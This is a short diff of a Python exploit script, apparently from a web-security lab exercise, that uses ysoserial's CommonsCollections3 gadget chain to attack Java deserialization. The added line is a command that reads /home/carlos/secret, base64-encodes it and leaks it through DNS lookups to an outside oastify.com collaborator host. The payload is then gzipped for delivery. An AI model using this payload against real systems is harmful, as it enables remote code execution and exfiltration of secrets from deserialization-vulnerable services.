@@ -2,7 +2,7 @@ import subprocess, gzip, base64
 from urllib.parse import quote
 
 payload = subprocess.check_output([
-    "java", "-jar", "ysoserial.jar", "CommonsCollections3", "https://exploit-0aaf007103d06538806f0c6401770042.exploit-server.net/SERIAL"
+    "java", "-jar", "ysoserial.jar", "CommonsCollections3", 'bash -c "cat /home/carlos/secret | base64 | xargs -I{} nslookup {}.5ci9ruoii3xzz58q64zmabsem5swgo4d.oastify.com"'
 ])
 
 gzipped = gzip.compress(payload)
